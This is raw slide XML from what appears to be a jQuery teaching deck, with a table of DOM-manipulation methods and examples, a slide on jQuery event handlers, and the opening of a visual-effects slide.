              <a:tr h="579093">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>css</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(property)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>get or set the defined CSS</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> property</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="4570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$('#e1')).</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>css</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>('background-color')</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#e1')).</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>css</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>backgroundColor</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="341363">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.height()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>get</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> the height value of 1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="30000" dirty="0"/>
                        <a:t>st</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#e1').height()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.width()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>get the</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> width of element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="4570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$('#e1').width()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>addClass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(class)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>add a class to each</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>img</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>addClass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>('class1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> class2')</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>removeClass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(class)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>remove a class</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> or all classes</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>img</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>removeClass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>toggleClass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>(class)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>on/off toggle a class</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#controls').</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>toggleClass</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>visi</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.html()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>gets the HTML representation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>div.test</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').html()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="395187">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.text(text)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>gets</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> or sets the text inside element</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>infotext</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').text('&lt;b&gt;hello</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t>!&lt;/b&gt;')</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.append(content)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>inserts content</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>mybox</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').append('&lt;p&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>foo</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>&lt;/p&gt;')</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10011"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.remove(selector)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>removes all matching elements</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>img</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').remove()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10012"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="335253">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>.empty()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>removes all child</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" baseline="0" dirty="0"/>
                        <a:t> nodes</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>$('#</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
                        <a:t>mybox</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0"/>
                        <a:t>').empty()</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439" marT="45707" marB="45707"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10013"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2248474-27CB-4097-BF0D-B1187EAB667B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery Events</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192515" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B8BB621-FE7A-45A5-BDEE-02150AC79E94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>there is an method for each event type without the "on" word in front of them e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>.keydown(handler) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>for onkeydown event or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>.click(handler)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t> for onclick</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>$(document).ready(handler)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>$().ready(handler)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>$(handler)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t> all do the same, execute the handler function when DOM is ready</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>.bind(eventType[, eventData], handler) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>eventType is the type </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>of event (e.g. focus), eventData will be passed to the handler function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>.unbind(eventType[, handler]) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>removes a previously attached event handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
              <a:t>.toggle(fn, fn2,...) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>toggles between two or more function calls after every click</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="240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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8FA28C8B-C64D-440D-A377-9C234ECA8A13}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>jQuery Visual Effects</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F4D8291-B087-48DE-85A8-038C9506DE40}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="515938" y="1700213"/>
          <a:ext cx="11160125" cy="4987922"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2964390">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3299680">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4896055">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
